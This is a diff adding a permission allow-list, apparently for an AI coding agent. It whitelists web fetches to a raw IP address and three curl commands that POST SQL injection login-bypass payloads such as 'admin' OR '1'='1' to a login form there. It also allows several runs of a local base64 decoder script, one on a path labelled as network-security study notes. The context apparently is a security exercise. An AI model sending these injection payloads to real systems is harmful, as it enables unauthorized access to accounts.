@@ -1,0 +1,14 @@
+{
+  "permissions": {
+    "allow": [
+      "WebFetch(domain:124.221.18.25)",
+      "Bash(curl -s -X POST http://124.221.18.25:50634/ -d \"name=admin' OR '1'='1&pwd=admin' OR '1'='1\")",
+      "Bash(curl -s -X POST http://124.221.18.25:50634/ -d \"name=admin' OR 1=1 -- -&pwd=test\")",
+      "Bash(curl -s -X POST http://124.221.18.25:50634/ -d \"name=admin' OR 1=1 #&pwd=test\")",
+      "Bash(python base64_decoder.py 1.txt)",
+      "Bash(python base64_decoder.py 1.txt -o result.txt)",
+      "Bash(python base64_decoder.py \"E:\\\\Code\\\\MyStudyData\\\\3、网络安全\\\\知识点\\\\1.txt\")",
+      "Bash(python base64_decoder.py)"
+    ]
+  }
+}
